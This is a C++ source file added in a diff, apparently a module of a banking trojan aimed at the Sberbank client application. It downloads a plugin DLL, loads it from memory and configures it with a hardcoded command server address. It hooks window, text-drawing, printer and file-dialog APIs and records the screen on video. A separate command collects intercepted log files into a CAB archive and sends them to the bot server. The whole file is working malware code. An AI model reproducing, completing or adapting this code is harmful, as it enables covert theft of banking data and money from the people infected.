@@ -1,0 +1,396 @@
+#include <windows.h>
+#include <windowsx.h>
+#include "GetApi.h"
+#include "Utils.h"
+#include "Memory.h"
+#include "Strings.h"
+#include "BotUtils.h"
+#include "Rootkit.h"
+#include "Inject.h"
+#include "Unhook.h"
+#include "Splice.h"
+#include "Config.h"
+#include "Crypt.h"
+#include "Sber.h"
+#include "Plugins.h"
+#include "DllLoader.h"
+#include "VideoRecorder.h"
+
+#include "CabPacker.h"
+#include "Loader.h"
+
+#include "BotDebug.h"
+
+namespace SBER_DOWNLOAD_DLL
+{
+    #include "DbgTemplates.h"
+}
+#define MSG_SBER  SBER_DOWNLOAD_DLL::DBGOutMessage<>
+
+// Импорт из Sb.dll
+typedef BOOL( WINAPI *PInitFunc )		(DWORD origFunc, char *funcName);
+typedef VOID( WINAPI *PSetParams )		(char *AHost, char *AUid);
+typedef BOOL( WINAPI *PShowWindow )		( HWND hWnd, int nCmdShow );
+typedef BOOL( WINAPI *PTranslateMessage )( const MSG *lpMsg );
+typedef BOOL( WINAPI *PTextOutA )		(HDC hdc, int x, int y, LPCSTR lpString, int c);
+typedef BOOL ( WINAPI *PTextOutW )( HDC hdc, int x, int y, LPCWSTR lpString, int c);
+
+typedef int ( WINAPI *PDrawTextA )(HDC hdc, LPCSTR lpchText, int cchText, LPRECT lprc, UINT format);
+
+typedef int ( WINAPI *PDrawTextW )(HDC hdc, LPCWSTR lpchText, int cchText, LPRECT lprc, UINT format);
+
+typedef int ( WINAPI *PDrawTextExA )(HDC hdc, LPSTR lpchText, int cchText, LPRECT lprc, UINT format,
+																		LPDRAWTEXTPARAMS lpdtp);
+
+typedef int ( WINAPI *PDrawTextExW )(HDC hdc, LPWSTR lpchText, int cchText, LPRECT lprc, UINT format,
+																		LPDRAWTEXTPARAMS lpdtp);
+
+typedef BOOL ( WINAPI *PExtTextOutA )(HDC hdc, int x, int y, UINT options, CONST RECT * lprect,
+																			LPCSTR lpString, UINT c, CONST INT * lpDx);
+typedef BOOL ( WINAPI *PExtTextOutW )(HDC hdc, int x, int y, UINT options, CONST RECT * lprect,
+																			LPCWSTR lpString, UINT c, CONST INT * lpDx);
+
+typedef BOOL ( WINAPI *PEnumPrintersA)(DWORD Flags, LPSTR Name, DWORD Level, LPBYTE  pPrinterEnum,
+																			DWORD cbBuf, LPDWORD pcbNeeded, LPDWORD pcReturned);
+
+typedef BOOL  ( WINAPI *PGetSaveFileNameA )(LPOPENFILENAME lpofn);
+typedef BOOL  ( WINAPI *PGetOpenFileNameA )(LPOPENFILENAME lpofn);
+
+// Храним адреса перехваченных функций
+static PShowWindow Real_ShowWindow;
+static PTranslateMessage Real_TranslateMessage;
+static PTextOutA Real_TextOutA;
+static PTextOutW Real_TextOutW;
+static PDrawTextA Real_DrawTextA;
+static PDrawTextW Real_DrawTextW;
+static PExtTextOutA Real_ExtTextOutA;
+static PExtTextOutW Real_ExtTextOutW;
+static PDrawTextExA Real_DrawTextExA;
+static PDrawTextExW Real_DrawTextExW;
+static PEnumPrintersA Real_EnumPrintersA;
+static PGetSaveFileNameA Real_GetSaveFileNameA;
+static PGetOpenFileNameA Real_GetOpenFileNameA;
+
+
+/************************************************************************/
+bool WINAPI IsSberProcess()
+{
+	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH*sizeof (WCHAR) );
+	if ( ModulePath == NULL )return false;
+	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
+	DWORD dwProcessHash = GetNameHash( ModulePath );
+
+	if ( dwProcessHash == 0x321ecf12 )
+	{
+		MemFree( ModulePath );
+		return true;
+	}
+
+	MemFree( ModulePath );/**/
+	return false;
+}
+
+
+BOOL isFileExist1(CHAR* filename)
+{
+	DWORD attr = (DWORD)pGetFileAttributesA(filename);
+	if(attr == INVALID_FILE_ATTRIBUTES) return FALSE;
+	return TRUE;
+}
+/************************************************************************/
+bool HookSberApi()
+{
+
+
+	char SBPlugin[] = {'S','b','T','e','s','t','.','p','l','u','g',0};
+	
+	PCHAR sAppData = STR::Alloc(MAX_PATH * sizeof(CHAR));// (CHAR*)MemAlloc(MAX_PATH * sizeof(CHAR));
+	pExpandEnvironmentStringsA("%AllUsersProfile%\\sb_t.dat", sAppData, MAX_PATH);
+ MSG_SBER("Sber",sAppData);
+	DWORD Size=0;
+	LPBYTE BotModule;
+	MSG_SBER("Sber","HookSberApi Download");
+	if (isFileExist1(sAppData))
+	{
+		BotModule=File::ReadToBufferA(sAppData,Size);
+			MSG_SBER("Sber","download from file");
+	}
+	else
+	{
+		
+		MSG_SBER("Sber","HookSberApi Download from inet");
+		BotModule   = Plugin::Download("sbtest.plug", NULL, &Size);
+		if (BotModule == NULL)
+		{
+			//pExitProcess(0);
+			MSG_SBER("Sber","Plugin Faild");
+			return 0;
+		}
+		File::WriteBufferA(sAppData,BotModule,Size);
+	}
+	MSG_SBER("Sber","Download");
+	STR::Free(sAppData);
+	HMEMORYMODULE hLib = MemoryLoadLibrary( BotModule );
+	if (hLib==NULL)
+	{	
+		MSG_SBER("Sber","can not loaded");
+		return 0;
+	}
+	MSG_SBER("Sber","loaded");
+
+	typedef void (WINAPI *PStartClient)( char *Server, int Port, char *Uid, int BrowserType );
+
+	char StartInitFunc_func[] = {'I','n','i','t','F','u','n','c',0};
+
+	PInitFunc pInitFunc = (PInitFunc)MemoryGetProcAddress( hLib, StartInitFunc_func );
+	if (pInitFunc==NULL)
+	{	
+		MSG_SBER("Sber","can not loaded",StartInitFunc_func);
+		return 0;
+	}
+
+	PSetParams SetParamsSBR = (PSetParams)MemoryGetProcAddress(hLib, "SetParams");
+	if (SetParamsSBR==NULL)
+	{
+		MSG_SBER("Sber","can not loaded",StartInitFunc_func);
+		return 0;		
+	}
+	MSG_SBER("Sber","SetParams is ok?");
+
+	PCHAR UID=STR::Alloc(120);
+	GenerateUid(UID);
+	MSG_SBER("Sber",UID);
+	
+	SetParamsSBR("http://95.168.178.21/test/", UID);
+	MSG_SBER("Sber","SetParams ok.");
+	STR::Free(UID);
+
+
+
+	//* ShowWindow hook *//
+	DWORD dwFuncAddr = (DWORD)MemoryGetProcAddress(hLib, "ShowWindowCallBack");
+	if (!dwFuncAddr)
+	{
+		MSG_SBER("Sber","return false.");
+		return false;
+	}
+	if ( HookApi( 3, 0x7506E960, dwFuncAddr ) )
+	{  
+		__asm mov [Real_ShowWindow], eax			
+
+		if ( pInitFunc((DWORD)Real_ShowWindow, "ShowWindow") )
+			MSG_SBER("Sber","ShowWindow hook ok.");
+	}	
+
+	//* TranslateMessage hook *//
+	dwFuncAddr = (DWORD)MemoryGetProcAddress(hLib, "TranslateMessageCallBack");
+	if (!dwFuncAddr) return false;
+	
+	if ( HookApi( 3, 0xC45D9631, (DWORD)dwFuncAddr ) )
+	{
+		__asm mov [Real_TranslateMessage], eax
+
+		if ( pInitFunc((DWORD)Real_TranslateMessage, "TranslateMessage") )
+			MSG_SBER("Sber","TranslateMessage hook ok.");
+	}
+
+	//* DrawTextA hook *//
+	dwFuncAddr = (DWORD)MemoryGetProcAddress(hLib, "DrawTextACallBack");
+	if (!dwFuncAddr) return false;
+	
+	if ( HookApi( 3, 0x85BBDFC, (DWORD)dwFuncAddr ) )
+	{
+		__asm mov [Real_DrawTextA], eax
+
+		if ( pInitFunc((DWORD)Real_DrawTextA, "DrawTextA") )
+			MSG_SBER("Sber","DrawTextA hook ok.");
+	}
+
+	//* DrawTextW hook *//
+	dwFuncAddr = (DWORD)MemoryGetProcAddress(hLib, "DrawTextWCallBack");
+	if (!dwFuncAddr) return false;
+	
+	if ( HookApi( 3, 0x85BBDEA, (DWORD)dwFuncAddr ) )
+	{
+		__asm mov [Real_DrawTextW], eax
+
+		if ( pInitFunc((DWORD)Real_DrawTextW, "DrawTextW") )
+			MSG_SBER("Sber","DrawTextW hook ok.");
+	}
+                                         
+	//* DrawTextExA hook *//
+	dwFuncAddr = (DWORD)MemoryGetProcAddress(hLib, "DrawTextExACallBack");
+	if (!dwFuncAddr) return false;
+	
+	if ( HookApi( 3, 0xEF7E3E57, (DWORD)dwFuncAddr ) )
+	{
+		__asm mov [Real_DrawTextExA], eax
+
+		if ( pInitFunc((DWORD)Real_DrawTextExA, "DrawTextExA") )
+			MSG_SBER("Sber","DrawTextExA hook ok.");
+	}
+
+	//* DrawTextExW hook *//
+	dwFuncAddr = (DWORD)MemoryGetProcAddress(hLib, "DrawTextExWCallBack");
+	if (!dwFuncAddr) return false;
+	
+	if ( HookApi( 3, 0xEF7E3E41, (DWORD)dwFuncAddr ) )
+	{
+		__asm mov [Real_DrawTextExW], eax
+
+		if ( pInitFunc((DWORD)Real_DrawTextExW, "DrawTextExW") )
+			MSG_SBER("Sber","DrawTextExW hook ok.");
+	}
+
+	//* TextOutA hook *//
+	dwFuncAddr = (DWORD)MemoryGetProcAddress(hLib, "TextOutACallBack");
+	if (!dwFuncAddr) return false;
+	
+	if ( HookApi( DLL_GDI, 0x4954ED86, (DWORD)dwFuncAddr ) )
+	{
+		__asm mov [Real_TextOutA], eax
+
+		if ( pInitFunc((DWORD)Real_TextOutA, "TextOutA") )
+			MSG_SBER("Sber","TextOutA hook ok.");
+	}
+
+			//* TextOutW hook *//
+			dwFuncAddr = (DWORD)MemoryGetProcAddress(hLib, "TextOutWCallBack");
+			if (!dwFuncAddr) return false;
+			
+			if ( HookApi( DLL_GDI, 0x4954ED90, (DWORD)dwFuncAddr ) )
+			{
+				__asm mov [Real_TextOutW], eax
+
+				if ( pInitFunc((DWORD)Real_TextOutW, "TextOutW") )
+					MSG_SBER("Sber","TextOutW hook ok.");
+			}
+	//* ExtTextOutA hook *//
+	dwFuncAddr = (DWORD)MemoryGetProcAddress(hLib, "ExtTextOutACallBack");
+	if (!dwFuncAddr) return false;
+	
+	if ( HookApi( DLL_GDI, 0x3D54FCFA, (DWORD)dwFuncAddr ) )
+	{
+		__asm mov [Real_ExtTextOutA], eax
+
+		if ( pInitFunc((DWORD)Real_ExtTextOutA, "ExtTextOutA") )
+			MSG_SBER("Sber","ExtTextOutA hook ok.");
+	}
+
+			//* ExtTextOutW hook *//
+			dwFuncAddr = (DWORD)MemoryGetProcAddress(hLib, "ExtTextOutWCallBack");
+			if (!dwFuncAddr) return false;
+			
+			if ( HookApi( DLL_GDI, 0x3D54FCEC, (DWORD)dwFuncAddr ) )
+			{
+				__asm mov [Real_ExtTextOutW], eax
+
+				if ( pInitFunc((DWORD)Real_ExtTextOutW, "ExtTextOutW") )
+					MSG_SBER("Sber","ExtTextOutW hook ok.");
+			}
+	//* EnumPrintersA hook *//
+	dwFuncAddr = (DWORD)MemoryGetProcAddress(hLib, "EnumPrintersACallBack");
+	if (!dwFuncAddr) return false;
+	
+	if ( HookApi( WINSPOOL_DRV, 0x9804C3C0, (DWORD)dwFuncAddr ) )
+	{
+		__asm mov [Real_EnumPrintersA], eax
+
+		if ( pInitFunc((DWORD)Real_EnumPrintersA, "EnumPrintersA") )
+			MSG_SBER("Sber","EnumPrintersA hook ok.");
+	}
+
+	//* GetSaveFileNameA hook *//
+	dwFuncAddr = (DWORD)MemoryGetProcAddress(hLib, "GetSaveFileNameACallBack");
+	if (!dwFuncAddr) return false;
+	
+	if ( HookApi( COMANDLG32_DLL, 0x8FD473C8, (DWORD)dwFuncAddr ) )
+	{
+		__asm mov [Real_GetSaveFileNameA], eax
+
+		if ( pInitFunc((DWORD)Real_GetSaveFileNameA, "GetSaveFileNameA") )
+			MSG_SBER("Sber","GetSaveFileNameA hook ok.");
+	}
+
+	//* GetOpenFileNameA hook *//
+	dwFuncAddr = (DWORD)MemoryGetProcAddress(hLib, "GetOpenFileNameACallBack");
+	if (!dwFuncAddr) return false;
+	
+	if ( HookApi( COMANDLG32_DLL, 0xE16570D, (DWORD)dwFuncAddr ) )
+	{
+		__asm mov [Real_GetOpenFileNameA], eax
+
+		if ( pInitFunc((DWORD)Real_GetOpenFileNameA, "GetOpenFileNameA") )
+			MSG_SBER("Sber","GetOpenFileNameA hook ok.");
+	}
+
+	
+	MSG_SBER("Sber","пишем видио.");
+	StartRecordThread(GetUniquePID(),"Sber", NULL, NULL,700);
+	return true;
+}
+
+
+/************************************************************************/
+bool HookSber()
+{
+	if ( IsSberProcess() )
+	{
+		UnhookSber();
+		HookSberApi();
+		return true;
+	}
+
+	return false;
+}
+
+
+DWORD MetodPack(PFindData Search, // Структура поиска
+								PCHAR FileName,   // Имя найденного файла
+								LPVOID Data,      // Данные переданные в функцию поиска
+								bool &Cancel      // Указание прервать дальнейший поиск
+								)
+
+{
+	
+	AddFileToCab( (HCAB)Data, FileName, Search->cFileName );
+	return 0;
+}
+DWORD WINAPI grabsberlog()
+{
+	//жмем в каб все %Temp%\\*.dat, и после этого щлем на сервак
+	MSG_SBER("SBER","отошлем ка каб со всеми данными");
+
+	PCHAR sTEMPProfile = STR::Alloc(MAX_PATH );
+	pExpandEnvironmentStringsA( ("%Temp%\\"), sTEMPProfile, MAX_PATH);
+	
+	PCHAR Path = File::GetTempNameA();
+	if ( Path )
+	{
+		HCAB hCab = NULL;
+
+		if ( ( hCab = CreateCab( Path ) ) != NULL )
+		{
+			SearchFiles(sTEMPProfile, "Intercept.log", false, FA_ANY_FILES, hCab, (TFilesCallBack)MetodPack);
+			SearchFiles("c:\\", "rt2.log", false, FA_ANY_FILES, hCab, (TFilesCallBack)MetodPack);
+		}
+		CloseCab( hCab );
+		
+		PCHAR HOST_Data=GetBotScriptURL(SCRIPT_CAB);
+				
+		if (DataGrabber::SendCabDelayed(HOST_Data,Path,"SBER"))
+		{
+			MSG_SBER("SBER","вроде отослали");
+			//Hosts::SetBankingMode();
+		}
+		else
+			MSG_SBER("SBER","Нехочет отсылать");
+		pDeleteFileA(Path);		
+	}
+	return 0;
+}
+
+bool ExecuteGrabSberLogCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
+{
+	return StartThread(grabsberlog, NULL) != NULL;;
+}
